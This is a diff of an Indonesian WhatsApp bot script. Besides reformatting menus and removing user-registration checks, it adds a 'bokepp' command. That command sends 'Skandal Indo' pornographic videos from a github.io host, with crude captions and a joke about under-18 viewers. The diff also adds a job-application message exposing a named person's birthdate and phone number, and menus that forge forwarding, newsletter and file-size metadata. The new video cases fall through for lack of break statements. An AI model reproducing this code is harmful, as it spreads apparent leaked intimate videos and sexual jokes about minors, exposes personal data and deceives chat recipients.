+             { buttonId: 'self', buttonText: { displayText: 'Self' }, type: 1 },
+        { buttonId: 'public', buttonText: { displayText: 'Public' }, type: 1 }
     ],
-    viewOnce: true,
-    contextInfo: {
-        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
-        forwardingScore: 10,
-        isForwarded: true,
-        forwardedNewsletterMessageInfo: {
-            newsletterJid: my.ch,
-            serverMessageId: null,
-            newsletterName: `${botname}${randomEmoji}`
-        },
-        externalAdReply: {
-            title: author,
-            body: packname,
-            showAdAttribution: true,
-            thumbnailUrl: profile,
-            mediaType: 1,
-            previewType: 0,
-            renderLargerThumbnail: true,
-            mediaUrl: my.gh,
-            sourceUrl: my.gh,
+        viewOnce: true,
+        headerType: 4, // Mengatur header untuk teks/gambar
+        contextInfo: {
+            mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
+            forwardingScore: 10,
+            isForwarded: true,
+            forwardedNewsletterMessageInfo: {
+                newsletterJid: my.ch,
+                serverMessageId: null,
+                newsletterName: `${botname}${randomEmoji}`
+            },
+            externalAdReply: {
+                title: author,
+                body: packname,
+                showAdAttribution: true,
+                thumbnailUrl: profile,
+                mediaType: 1,
+                previewType: 0,
+                renderLargerThumbnail: true,
+                mediaUrl: my.gh,
+                sourceUrl: my.gh
+            }
         }
-    }
-}, {
-    quoted: fkontak
-});
+    }, {
+        quoted: fkontak
+    });
 
-// Mengirim stiker
-await sych.sendMessage(m.chat, {
-    sticker: {
-        url: 'src/media/stc.webp'
-    }, // Path file stiker
-    mimetype: 'image/webp',
-}, {
-    quoted: floc
-});
+    // Debugging tombol sebelumnya
+    console.log("Button 1: ");
+    console.log(`ButtonId: ${prefix}pushkontak2`);
+    console.log(`Button Text: PushKontak2`);
+    console.log(`Button Type: 1`);
 
-sych.sendMessage(m.chat, {
-    react: {
-        text: randomEmoji, // Emoji acak
-        key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
-    }
-});
-			}
+    console.log("Button 2: ");
+    console.log(`ButtonId: ${prefix}list`);
+    console.log(`Button Text: List GC`);
+    console.log(`Button Type: 1`);
+
+    // Debugging informasi lainnya
+    console.log("Sent Message Info: ");
+    console.log(`Caption: ${menunya}`);
+    console.log(`FileName: ${ucapanWaktu}`);
+    console.log(`Mimetype: ${pickRandom(fake.listfakedocs)}`);
+    console.log(`FileLength: 100000000000000`);
+    console.log(`PageCount: 999`);
+    console.log("Context Info: ");
+    console.log(`Forwarding Score: 10`);
+    console.log(`Is Forwarded: true`);
+    console.log(`Newsletter Name: ${botname}${randomEmoji}`);
+    console.log(`External Ad URL: ${my.gh}`);
+
+    // Kirim stiker
+    await sych.sendMessage(m.chat, {
+        sticker: { url: 'src/media/stc.webp' }, // Path stiker
+        mimetype: 'image/webp',
+    }, {
+        quoted: floc
+    });
+
+    // Memberikan reaksi emoji
+    await sych.sendMessage(m.chat, {
+        react: {
+            text: randomEmoji, // Emoji acak
+            key: m.key // Reaksi ke pesan sebelumnya
+        }
+    });
+
+
+    
+    
+
+
+} 
 			break;
 			
 			//list push
@@ -9609,7 +19450,7 @@ sych.sendMessage(m.chat, {
 			
 			
 			case "list": case "cekid": case"listgrup": {
-			    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+			     
 let gcall = Object.values(await sych.groupFetchAllParticipating().catch(_=> null))
 let listgc = `*｢ LIST ALL CHAT GRUP ｣*\n\n`
 await gcall.forEach((u, i) => {
@@ -9708,11 +19549,226 @@ break;
 break;
 
 
+//bokep
+case 'bokepp': {
+let sections = [{
+title: 'Pilihan Bokep buat Pler',
+highlight_label: '🔥 Top',
+rows: [{
+title: 'Skandal indo',
+description: `G4k ku4t d1 hut4n d1 g45`, 
+id: `v1`
+},
+{
+title: 'Skandal Indo v2', 
+description: "5 Video", 
+id: `v2`
+},
+{
+title: 'Skandal Indo v3', 
+description: "5 Video", 
+id: `v3`
+}]
+}]
+
+let listMessage = {
+    title: 'Select Option', 
+    sections
+};
+
+let msg = generateWAMessageFromContent(m.chat, {
+ viewOnceMessage: {
+ message: {
+ "messageContextInfo": {
+ "deviceListMetadata": {},
+ "deviceListMetadataVersion": 2
+ },
+ interactiveMessage: proto.Message.InteractiveMessage.create({
+ contextInfo: {
+ mentionedJid: [m.sender], 
+ isForwarded: true, 
+ forwardedNewsletterMessageInfo: {
+ newsletterJid: '120363373320014871@newsletter',
+ newsletterName: 'Powered By Galangxyz', 
+ serverMessageId: -1
+},
+ businessMessageForwardInfo: { businessOwnerJid: sych.decodeJid(sych.user.id) },
+ }, 
+ body: proto.Message.InteractiveMessage.Body.create({
+ text: `${n}Selamat Ng0c0k${n}\n\n`   
+ }),
+ footer: proto.Message.InteractiveMessage.Footer.create({
+ text: `> 18++\n\nDi bawah 18+ tunggu pecah bulu`
+ }),
+ header: proto.Message.InteractiveMessage.Header.create({
+ title: `*Woii @${sender.split("@")[0]}*`,
+ subtitle: "",
+ hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://Galangxyz.github.io/bkp/15.jpg" } }, { upload: sych.waUploadToServer }))
+ }),
+ nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+ buttons: [ 
+ {
+ "name": "single_select",
+"buttonParamsJson": JSON.stringify(listMessage)
+ },
+ ]
+ })
+ })
+ }
+ }
+}, {})
+
+await sych.relayMessage(msg.key.remoteJid, msg.message, {
+ messageId: msg.key.id
+})}
+break
+case 'v1': {
+    let msg = generateWAMessageFromContent(from, {
+        viewOnceMessage: {
+            message: {
+                "messageContextInfo": {
+                    "deviceListMetadata": {},
+                    "deviceListMetadataVersion": 2
+                },
+                interactiveMessage: proto.Message.InteractiveMessage.create({
+                    body: proto.Message.InteractiveMessage.Body.create({
+                        text: `${n}Viral Indo 1${n}`
+                    }),
+                    footer: proto.Message.InteractiveMessage.Footer.create({
+                        text: `> Titile :\n\nG4k ku4t d1 hut4n d1 g45`
+                    }),
+                    header: proto.Message.InteractiveMessage.Header.create({
+                        title: ``,
+                        gifPlayback: true,
+                        subtitle: 'galang',
+                        hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: { url: "https://Galangxyz.github.io/bkp/1.mp4" } }, { upload: sych.waUploadToServer }))
+ }),
+                    
+                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                        buttons: [
+                            
+                        ],
+                    }),
+                    contextInfo: {
+                        mentionedJid: [m.sender],
+                        forwardingScore: 999,
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                              newsletterName: 'Powered By Galangxyz', 
+                              newsletterJid:'120363373320014871@newsletter',
+                            serverMessageId: 143
+                        }
+                    }
+                })
+            }
+        }
+    }, { quoted: memek });
+
+    await sych.relayMessage(msg.key.remoteJid, msg.message, {
+        messageId: msg.key.id
+    });
+}
+case 'v2': {
+    let msg = generateWAMessageFromContent(from, {
+        viewOnceMessage: {
+            message: {
+                "messageContextInfo": {
+                    "deviceListMetadata": {},
+                    "deviceListMetadataVersion": 2
+                },
+                interactiveMessage: proto.Message.InteractiveMessage.create({
+                    body: proto.Message.InteractiveMessage.Body.create({
+                        text: `${n}Viral Indo 2${n}`
+                    }),
+                    footer: proto.Message.InteractiveMessage.Footer.create({
+                        text: `> Titile :\n\nB4p4k k4ndun9`
+                    }),
+                    header: proto.Message.InteractiveMessage.Header.create({
+                        title: ``,
+                        gifPlayback: true,
+                        subtitle: 'galang',
+                        hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: { url: "https://Galangxyz.github.io/bkp/2.mp4" } }, { upload: sych.waUploadToServer }))
+ }),
+                    
+                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                        buttons: [
+                            
+                        ],
+                    }),
+                    contextInfo: {
+                        mentionedJid: [m.sender],
+                        forwardingScore: 999,
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                              newsletterName: 'Powered By Galangxyz', 
+                              newsletterJid:'120363373320014871@newsletter',
+                            serverMessageId: 143
+                        }
+                    }
+                })
+            }
+        }
+    }, { quoted: memek });
+
+    await sych.relayMessage(msg.key.remoteJid, msg.message, {
+        messageId: msg.key.id
+    });
+}
+case 'v3': {
+    let msg = generateWAMessageFromContent(from, {
+        viewOnceMessage: {
+            message: {
+                "messageContextInfo": {
+                    "deviceListMetadata": {},
+                    "deviceListMetadataVersion": 2
+                },
+                interactiveMessage: proto.Message.InteractiveMessage.create({
+                    body: proto.Message.InteractiveMessage.Body.create({
+                        text: `${n}Viral Indo 3${n}`
+                    }),
+                    footer: proto.Message.InteractiveMessage.Footer.create({
+                        text: `> Titile :\n\ng4ngb4ng`
+                    }),
+                    header: proto.Message.InteractiveMessage.Header.create({
+                        title: ``,
+                        gifPlayback: true,
+                        subtitle: 'galang',
+                        hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: { url: "https://Galangxyz.github.io/bkp/3.mp4" } }, { upload: sych.waUploadToServer }))
+ }),
+                    
+                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                        buttons: [
+                            
+                        ],
+                    }),
+                    contextInfo: {
+                        mentionedJid: [m.sender],
+                        forwardingScore: 999,
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                              newsletterName: 'Powered By Galangxyz', 
+                              newsletterJid:'120363373320014871@newsletter',
+                            serverMessageId: 143
+                        }
+                    }
+                })
+            }
+        }
+    }, { quoted: memek });
+
+    await sych.relayMessage(msg.key.remoteJid, msg.message, {
+        messageId: msg.key.id
+    });
+}
+break
+
+
+
 
 
 		//push
 case 'pushcontact': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!isCreator) return sych.sendMessage(m.chat, { text: mess.owner });
     if (!m.isGroup) return sych.sendMessage(m.chat, { text: mess.private });
 
@@ -9746,7 +19802,7 @@ case 'pushcontact': {
 break;
 
 case 'getcontact': case 'getcon': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     if (!m.isGroup) return sych.sendMessage(m.chat, { text: mess.group });
     if (!(m.isAdmin || isCreator)) return sych.sendMessage(m.chat, { text: mess.owner });
 
@@ -9776,10 +19832,92 @@ case 'getcontact': case 'getcon': {
         return sych.sendMessage(m.chat, { text: 'Terjadi kesalahan saat mengambil kontak.' });
     }
 }
+
+
+
 break;
+
+
+//lamaran
+case 'm2': 
+case 'selamat':
+case 'siang':
+case 'assalamualaikum':
+{
+			
+		
+    let msg = generateWAMessageFromContent(from, {
+        viewOnceMessage: {
+            message: {
+                "messageContextInfo": {
+                    "deviceListMetadata": {},
+                    "deviceListMetadataVersion": 2
+                },
+                interactiveMessage: proto.Message.InteractiveMessage.create({
+                   
+                    
+                    body: proto.Message.InteractiveMessage.Body.create({
+                        text: `${n}Assalamualaikum bapak/ibuk${n}\n\nDengan hormat,\nSesuai dengan informasi yang didapatkan melalui dari teman membuka lowongan, maka saya yang bertanda tangan di bawah ini:\n\n> Nama: ${n}M GALANG FEBRIANSYAH PRATAMA${n}\n\n> Tempat, Tanggal Lahir: ${n}Palembang, 05 Februari 2003${n}\n\n> Pendidikan: ${n}SMK${n}\n\nBermaksud untuk mengajukan diri melamar pekerjaan pada lowongan tersebut.\n\nBersama dengan surat ini, saya juga melampirkan dokumen yang dibutuhkan sebagai bahan pertimbangan.\n\nBesar harapan saya untuk menghadiri panggilan tes dan wawancara untuk menjelaskan lebih mendalam mengenai data diri saya.\n\nAtas perhatian Bapak/Ibu, saya ucapkan terima kasih.\n\nHormat saya,\n\n${n}M Galang Febriansyah Pratama${n}`
+                    }),
+                    footer: proto.Message.InteractiveMessage.Footer.create({
+                        text: '\n\nMy Profile Side ⤥'
+                    }),
+                    header: proto.Message.InteractiveMessage.Header.create({
+                        title: ``,
+                        gifPlayback: true,
+                        subtitle: `${owname}`,
+                        hasMediaAttachment: false
+                    }),
+                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                        buttons: [
+                            {
+                            name: "cta_url",
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Website 🌐",
+                                url: "https://www.galng.my.id/index1.html",
+                                merchant_url: "https://www.google.com"
+                            })
+                        },
+                        {
+                            name: "cta_url",
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Google Site Profile 🌐",
+                                url: "https://www.google.com/search?q=m+galang+febriansyah+pratama&newwindow=1&client=ms-android-vivo-rvo2&sca_esv=99607a7fcd853d87&sxsrf=ADLYWIIFKxBzIxyYtGFAuXOqlpFBSN_RCw%3A1737603855705&ei=D7uRZ5XhKvev4-EPst_yoQk&oq=m&gs_lp=Egxnd3Mtd2l6LXNlcnAiAW0qAggAMgQQIxgnMgQQIxgnMgoQIxiABBgnGIoFMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEC4YgAQYsQMYgwEyDhAAGIAEGLEDGIMBGIoFMgsQABiABBixAxiDAUjeJ1DLDViKGnABeAKQAQOYAdgBoAHsF6oBBjAuMTkuMbgBAcgBAPgBAZgCA6ACgQKoAgrCAgQQABhHwgIHECMYJxjqAsICDRAuGNEDGMcBGCcY6gLCAgoQIxjwBRgnGOoCmAMk8QVe2Tv0u7ck7YgGAZAGCJIHAzIuMaAH1soB&sclient=gws-wiz-ser",
+                                merchant_url: "https://www.google.com"
+                            })
+                        },
+                        {
+                            name: "cta_call",
+                            buttonParamsJson: JSON.stringify({
+                                display_text: "Phone Number",
+                                phone_number: "+6283833735020"
+                            })
+                        }
+                        ],
+                    }),
+                    contextInfo: {
+                    mentionedJid: [m.sender],
+                    isForwarded: false,
+                    forwardedNewsletterMessageInfo: {
+                        newsletterJid: '1@newsletter',
+                        newsletterName: 'M Galang Febriansyah Pratama',
+                        serverMessageId: -1,
+                    },
+                    businessMessageForwardInfo: { businessOwnerJid: sych.decodeJid(sych.user.id) },
+                },
+                })
+            }
+        }
+    }, { quoted: fmemek });
+
+    await sych.relayMessage(msg.key.remoteJid, msg.message, {
+        messageId: msg.key.id
+    });
+}
+break
 //savecntk
 case 'savecontact': case 'svcontact': {
-    if (!isRegistered) return sycreply('Kamu belum terdaftar! Silakan daftar terlebih dahulu dengan perintah "daftar".');
+     
     // Mengecek apakah pesan berada di grup dan apakah pengguna adalah admin atau creator
     if (!m.isGroup) return sych.sendMessage(m.chat, { text: mess.group });
     if (!(m.isAdmin || isCreator)) return sych.sendMessage(m.chat, { text: mess.owner });
@@ -9819,6 +19957,23 @@ case 'savecontact': case 'svcontact': {
         console.error(err);
         return sych.sendMessage(m.chat, { text: 'Terjadi kesalahan saat menyimpan kontak.' });
     }
+}
+break;
+
+case 'wi': 
+case 'help': 
+case 'list': 
+case 'listmenu': {
+    const title = "List Menu";
+    const options = [
+        'allmenuu',
+        'MenuGroup'
+        
+    ];
+    
+
+    // Kirim polling ke chat
+    sych.sendPoll(m.chat, title, options);
 }
 break;
 		
@@ -9888,6 +20043,8 @@ break;
         }
         break;
     }
+    
+    
 	} catch (err) {
 		console.log(util.format(err));
 		//sycreply('*❗ Internal server error️*');
